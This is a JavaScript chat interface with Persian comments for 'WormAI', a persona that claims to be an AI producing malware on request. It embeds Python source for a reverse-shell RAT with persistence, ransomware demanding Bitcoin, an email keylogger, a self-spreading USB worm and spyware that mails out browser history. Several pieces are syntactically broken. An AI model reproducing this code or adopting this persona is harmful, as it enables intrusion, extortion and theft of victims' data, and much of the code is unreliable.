// شیء اصلی برای مدیریت چت و تولید ویروس
const WormAI = {
    // دیتابیس پاسخ‌های آماده برای انواع ویروس‌ها
    payloads: {
        rat: {
            windows: import os
import socket
import subprocess
import threading
import sys
import shutil
import ctypes
import platform

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def persist():
    if not os.path.exists(os.environ['APPDATA'] + '\\WindowsUpdate'):
        os.makedirs(os.environ['APPDATA'] + '\\WindowsUpdate')
    shutil.copyfile(sys.executable, os.environ['APPDATA'] + '\\WindowsUpdate\\winupdate.exe')
    with open(os.environ['APPDATA'] + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.lnk', 'w') as f:
        f.write('[InternetShortcut]\nURL=file:///' + os.environ['APPDATA'] + '\\WindowsUpdate\\winupdate.exe')

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('YOUR_SERVER_IP', 4444))
            while True:
                command = s.recv(1024).decode()
                if command.lower() == 'exit':
                    s.close()
                    sys.exit()
                elif command.startswith('cd '):
                    os.chdir(command[3:])
                    s.send(b'Changed directory to ' + os.getcwd().encode())
                elif command.startswith('download '):
                    with open(command[9:], 'rb') as f:
                        s.send(f.read())
                elif command.startswith('upload '):
                    filename = command[7:]
                    with open(filename, 'wb') as f:
                        data = s.recv(1024)
                        while data:
                            f.write(data)
                            data = s.recv(1024)
                else:
                    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output = proc.stdout.read() + proc.stderr.read()
                    s.send(output)
        except:
            time.sleep(5)

if __name__ == '__main__':
    if is_admin():
        persist()
        connect()
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, "", None, 1),

            linux: `#!/usr/bin/env python3
import os
import socket
import subprocess
import threading
import sys
import shutil

def persist():
    home = os.path.expanduser("~")
    if not os.path.exists(home + '/.config/systemd'):
        os.makedirs(home + '/.config/systemd/user')
    with open(home + '/.config/systemd/user/updater.service', 'w') as f:
        f.write('[Unit]\nDescription=System Update Service\n\n[Service]\nExecStart=' + sys.executable + '\nRestart=always\n\n[Install]\nWantedBy=default.target')
    os.system('systemctl --user enable updater.service')
    os.system('systemctl --user start updater.service')

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('YOUR_SERVER_IP', 4444))
            while True:
                command = s.recv(1024).decode()
                if command.lower() == 'exit':
                    s.close()
                    sys.exit()
                elif command.startswith('cd '):
                    os.chdir(command[3:])
                    s.send(b'Changed directory to ' + os.getcwd().encode())
                elif command.startswith('download '):
                    with open(command[9:], 'rb') as f:
                        s.send(f.read())
                elif command.startswith('upload '):
                    filename = command[7:]
                    with open(filename, 'wb') as f:
                        data = s.recv(1024)
                        while data:
f.write(data)
                            data = s.recv(1024)
                else:
                    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output = proc.stdout.read() + proc.stderr.read()
                    s.send(output)
        except:
            time.sleep(5)

if name == '__main__':
    persist()
    connect()
        },

        ransomware: {
            windows: import os
import sys
import ctypes
from cryptography.fernet import Fernet

def generate_key():
    return Fernet.generate_key()

def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, 'rb') as f:
        original = f.read()
    encrypted = fernet.encrypt(original)
    with open(file_path, 'wb') as f:
        f.write(encrypted)

def encrypt_directory(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(('.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.jpg', '.png', '.mp3', '.mp4')):
                file_path = os.path.join(root, file)
                try:
                    encrypt_file(file_path, key)
                except:
                    pass

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if name == '__main__':
    if is_admin():
        key = generate_key()
        with open(os.path.join(os.environ['USERPROFILE'], 'Desktop', 'RECOVERY_KEY.txt'), 'wb') as f:
            f.write(key)
        encrypt_directory(os.environ['USERPROFILE'], key)
        ctypes.windll.user32.MessageBoxW(0, "All your files have been encrypted! Send 0.5 BTC to the following address to get your files back:\n1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", "RANSOMWARE ATTACK", 0x10)
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, "", None, 1),

            linux: #!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

def generate_key():
    return Fernet.generate_key()

def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, 'rb') as f:
        original = f.read()
    encrypted = fernet.encrypt(original)
    with open(file_path, 'wb') as f:
        f.write(encrypted)

def encrypt_directory(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(('.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.jpg', '.png', '.mp3', '.mp4')):
                file_path = os.path.join(root, file)
                try:
                    encrypt_file(file_path, key)
                except:
                    pass

if name == '__main__':
    key = generate_key()
    with open(os.path.join(os.path.expanduser('~'), 'Desktop', 'RECOVERY_KEY.txt'), 'wb') as f:
        f.write(key)
    encrypt_directory(os.path.expanduser('~'), key)
    os.system('zenity --error --text="All your files have been encrypted! Send 0.5 BTC to the following address to get your files back:\n1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa" --title="RANSOMWARE ATTACK"')
        },

        keylogger: {
            windows: import pynput.keyboard
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

class Keylogger:
    def init(self, time_interval, email, password):
        self.log = ""
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)
def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = email
        msg['Subject'] = "Keylogger Report"
        msg.attach(MIMEText(message, 'plain'))
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, msg.as_string())
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

if name == '__main__':
    keylogger = Keylogger(60, "YOUR_EMAIL@gmail.com", "YOUR_PASSWORD")
    keylogger.start()
        },

        worm: {
            windows: import os
import shutil
import socket
import subprocess
import threading

def spread():
    drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    for drive in drives:
        try:
            shutil.copyfile(__file__, os.path.join(drive, "svchost.exe"))
            with open(os.path.join(drive, "autorun.inf"), "w") as f:
                f.write("[autorun]\nopen=svchost.exe\nicon=svchost.exe")
        except:
            pass

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('YOUR_SERVER_IP', 4444))
            s.send(b"New infection: " + socket.gethostname().encode())
            s.close()
        except:
            pass
        time.sleep(300)

if name == '__main__':
    threading.Thread(target=spread).start()
    threading.Thread(target=connect).start()
        }
    },

    // پاسخ‌های هوش مصنوعی به درخواست‌ها
    responses: {
        rat: "در حال تولید تروجان دسترسی از راه دور (RAT) برای {os}... این ابزار به شما امکان کنترل کامل سیستم هدف را می‌دهد. بعد از اجرا روی سیستم قربانی، به سرور خود وصل می‌شه و می‌تونید دستورات رو ارسال کنید.",
        ransomware: "در حال تولید باج‌افزار برای {os}... این ویروس تمام فایل‌های مهم کاربر رو رمزنگاری می‌کنه و برای بازگردانی فایل‌ها درخواست پرداخت بیت‌کوین می‌کنه.",
        keylogger: "در حال تولید کی‌لاگر برای {os}... این ابزار تمام کلیدهای فشرده شده توسط کاربر رو ثبت می‌کنه و به ایمیل شما ارسال می‌کنه.",
        worm: "در حال تولید کرم شبکه برای {os}... این ویروس به صورت خودکار به سایر سیستم‌های شبکه منتقل می‌شه و خودش رو تکثیر می‌کنه.",
        spyware: "در حال تولید جاسوس‌افزار برای {os}... این ابزار اطلاعات شخصی کاربر رو جمع‌آوری می‌کنه و به سرور شما ارسال می‌کنه.",
        custom: "لطفا توضیحات کامل درباره نوع ویروس یا ابزاری که نیاز دارید رو ارائه بدید تا براتون تولید کنم."
    },

    // تابع برای نمایش پیام در چت
    addMessage: function(content, isUser = false) {
        const chatBox = document.getElementById('chatBox');
        const messageDiv = document.createElement('div');
        messageDiv.className = message ${isUser ? 'user' : 'ai'};

        const avatar = document.createElement('div');
        avatar.className = 'avatar';
        avatar.textContent = isUser ? '👤' : '🤖';

        const contentDiv = document.createElement('div');
        contentDiv.className = 'content';
        contentDiv.innerHTML = <p>${content}</p>`;

        messageDiv.appendChild(isUser ? contentDiv : avatar);
        messageDiv.appendChild(isUser ? avatar : contentDiv);

        chatBox.appendChild(messageDiv);
        chatBox.scrollTop = chatBox.scrollHeight;
    },

    // تابع برای تولید ویروس
    generatePayload: function(type, os) {
        const outputDiv = document.getElementById('payloadOutput');
        outputDiv.innerHTML = '';

        if (type === 'custom') {
            this.addMessage("لطفا توضیحات کامل درباره ویروس سفارشی خود را در چت وارد کنید.", false);
            return;
        }
const response = this.responses[type].replace('{os}', os === 'windows' ? 'ویندوز' : os === 'linux' ? 'لینوکس' : 'اندروید');
        this.addMessage(response, false);

        setTimeout(() => {
            if (this.payloads[type] && this.payloads[type][os]) {
                const code = this.payloads[type][os];
                outputDiv.innerHTML = <div class="code-actions">
                    <button onclick="copyToClipboard()"><i class="fas fa-copy"></i> کپی</button>
                    <button onclick="downloadCode('${type}_${os}.py')"><i class="fas fa-download"></i> دانلود</button>
                </div>
                <pre><code>${escapeHtml(code)}</code></pre>;
            } else {
                outputDiv.innerHTML = '<p style="color: var(--danger);">متاسفانه کد برای این ترکیب در دسترس نیست. لطفا نوع دیگری انتخاب کنید یا توضیحات سفارشی ارائه بدید.</p>';
            }
        }, 1500);
    },

    // تابع برای پاسخ به پیام کاربر
    respondToMessage: function(message) {
        const lowerMsg = message.toLowerCase();

        // تشخیص نوع درخواست
        if (lowerMsg.includes('ویروس') || lowerMsg.includes('virus')) {
            if (lowerMsg.includes('راه دور') || lowerMsg.includes('rat')) {
                this.generatePayload('rat', 'windows');
            } else if (lowerMsg.includes('باج') || lowerMsg.includes('ransomware')) {
                this.generatePayload('ransomware', 'windows');
            } else if (lowerMsg.includes('کی لاگر') || lowerMsg.includes('keylogger')) {
                this.generatePayload('keylogger', 'windows');
            } else if (lowerMsg.includes('کرم') || lowerMsg.includes('worm')) {
                this.generatePayload('worm', 'windows');
            } else if (lowerMsg.includes('جاسوس') || lowerMsg.includes('spyware')) {
                this.addMessage("در حال تولید جاسوس‌افزار... این ابزار اطلاعات شخصی کاربر رو جمع‌آوری می‌کنه و به سرور شما ارسال می‌کنه.", false);
                setTimeout(() => {
                    document.getElementById('payloadOutput').innerHTML = `
                    <div class="code-actions">
                        <button onclick="copyToClipboard()"><i class="fas fa-copy"></i> کپی</button>
                        <button onclick="downloadCode('spyware.py')"><i class="fas fa-download"></i> دانلود</button>
                    </div>
                    <pre><code>import os
import socket
import platform
import browserhistory as bh
import psutil
import wmi
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

def get_system_info():
    info = ""
    info += f"System: {platform.system()}\n"
    info += f"Node Name: {platform.node()}\n"
    info += f"Release: {platform.release()}\n"
    info += f"Version: {platform.version()}\n"
    info += f"Machine: {platform.machine()}\n"
    info += f"Processor: {platform.processor()}\n\n"

    c = wmi.WMI()
    for os in c.Win32_OperatingSystem():
        info += f"OS: {os.Caption}\n"
        info += f"Version: {os.Version}\n"
        info += f"Build: {os.BuildNumber}\n\n"

    for proc in c.Win32_Processor():
        info += f"CPU: {proc.Name}\n"

    for mem in c.Win32_PhysicalMemory():
        info += f"RAM: {int(mem.Capacity) / (1024**3):.2f} GB\n"

    return info

def get_browser_history():
    history = ""
    try:
        bh.get_browserhistory()
        for browser, data in bh.browsers.items():
            history += f"\n{browser} History:\n"
            for url in data['history']:
                history += f"{url[0]} - {url[1]}\n"
    except:
        pass
    return history

def get_network_info():
    info = ""
    for interface, addrs in psutil.net_if_addrs().items():
        info += f"\nInterface: {interface}\n"
        for addr in addrs:
            info += f"  {addr.family.name}: {addr.address}\n"
    return info
def send_email(subject, body, to_email, from_email, password):
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(from_email, password)
        text = msg.as_string()
        server.sendmail(from_email, to_email, text)
        server.quit()
    except Exception as e:
        pass

if name == '__main__':
    system_info = get_system_info()
    browser_history = get_browser_history()
    network_info = get_network_info()

    full_report = f"=== SYSTEM INFORMATION ===\n{system_info}\n\n"
    full_report += f"=== BROWSER HISTORY ===\n{browser_history}\n\n"
    full_report += f"=== NETWORK INFORMATION ===\n{network_info}"

    send_email(
        "Spyware Report from " + platform.node(),
        full_report,
        "YOUR_EMAIL@gmail.com",
        "YOUR_EMAIL@gmail.com",
        "YOUR_PASSWORD"
    )</code></pre>`;
                }, 2000);
            } else {
                this.addMessage("چه نوع ویروسی نیاز دارید؟ می‌تونم انواع مختلفی مثل RAT، باج‌افزار، کی‌لاگر، کرم شبکه و جاسوس‌افزار تولید کنم.", false);
            }
        } else if (lowerMsg.includes('سلام') || lowerMsg.includes('hi') || lowerMsg.includes('hello')) {
            this.addMessage("سلام! من WormAI هستم. هر نوع ویروس، ابزار هک یا کد مخرب که نیاز داری رو برات تولید می‌کنم. فقط درخواستتو بگو...", false);
        } else if (lowerMsg.includes('کمک') || lowerMsg.includes('help')) {
            this.addMessage("من می‌تونم برای شما تولید کنم:<br>" +
                "- RAT (تروجان دسترسی از راه دور)<br>" +
                "- باج‌افزار (رمزنگاری فایل‌ها)<br>" +
                "- کی‌لاگر (ثبت کلیدهای فشرده شده)<br>" +
                "- کرم شبکه (تکثیر خودکار)<br>" +
                "- جاسوس‌افزار (جمع‌آوری اطلاعات)<br>" +
                "- هر نوع ابزار سفارشی که نیاز دارید", false);
        } else {
            this.addMessage("متوجه درخواست شما نشدم. می‌تونم انواع ویروس‌ها و ابزارهای هک رو برای شما تولید کنم. فقط نوع ابزار مورد نظر رو مشخص کنید.", false);
        }
    }
};

// تابع برای کپی کردن کد به کلیپ‌بورد
function copyToClipboard() {
    const code = document.querySelector('#payloadOutput code').textContent;
    navigator.clipboard.writeText(code).then(() => {
        alert('کد با موفقیت کپی شد!');
    });
}

// تابع برای دانلود کد به عنوان فایل
function downloadCode(filename) {
    const code = document.querySelector('#payloadOutput code').textContent;
    const blob = new Blob([code], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

// تابع برای escape کردن HTML
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

// رویداد برای ارسال پیام
document.getElementById('sendBtn').addEventListener('click', () => {
    const input = document.getElementById('userInput');
    const message = input.value.trim();
    if (message) {
        WormAI.addMessage(message, true);
        input.value = '';
        setTimeout(() => {
            WormAI.respondToMessage(message);
        }, 500);
    }
});

// رویداد برای کلید Enter
document.getElementById('userInput').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        document.getElementById('sendBtn').click();
    }
});

// رویداد برای پاک کردن چت
document.getElementById('clearBtn').addEventListener('click', () => {
    document.getElementById('chatBox').innerHTML = '';
    WormAI.addMessage("چت پاک شد. من آماده تولید ویروس‌های جدید هستم...", false);
});
// رویداد برای دکمه تولید ویروس
document.getElementById('generateBtn').addEventListener('click', () => {
    const type = document.getElementById('payloadType').value;
    const os = document.getElementById('osTarget').value;
    WormAI.generatePayload(type, os);